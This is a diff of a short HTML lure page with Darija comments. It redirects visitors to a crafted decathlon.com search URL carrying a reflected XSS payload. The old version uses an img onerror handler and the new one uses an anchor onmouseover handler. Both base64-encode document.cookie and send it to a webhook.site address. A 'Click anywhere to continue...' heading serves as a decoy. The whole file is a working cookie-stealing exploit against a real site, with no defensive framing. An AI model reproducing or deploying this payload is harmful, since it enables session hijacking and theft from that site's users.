@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Verification...</title>
-</head>
 <body>
     <script>
-        // كود بسيط جداً: كيهز الكوكيز وكيرسلهم كـ اسم ديال صورة
-        let cookies = btoa(document.cookie).substring(0, 100); // هز غير طرف صغير للتجربة
+        // 1. هاد الرابط هو اللي فيه الثغرة
+        // Payload بسيط: كيهز الإيميل أو الكوكيز وكيدير Redirect للـ Webhook
         let webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
         
-        // كنصنعو رابط ديال صورة ملغم بالداتا
-        let target = "https://www.decathlon.com/search?q=<img src=x onerror=\"new Image().src='" + webhook + "?leak=' + btoa(document.cookie);\">";
-        
-        window.location.href = target;
+        // جربنا "a" tag حيت خفيفة بزااف وماتعيقش
+        let xss = "https://www.decathlon.com/search?q=<a/onmouseover='location=\"" + webhook + "?d=\"+btoa(document.cookie)'>MOVE_MOUSE_HERE</a>";
+
+        // 2. حول الصفحة لـ Decathlon
+        window.location.href = xss;
     </script>
+    <h1>Click anywhere to continue...</h1>
 </body>
 </html>
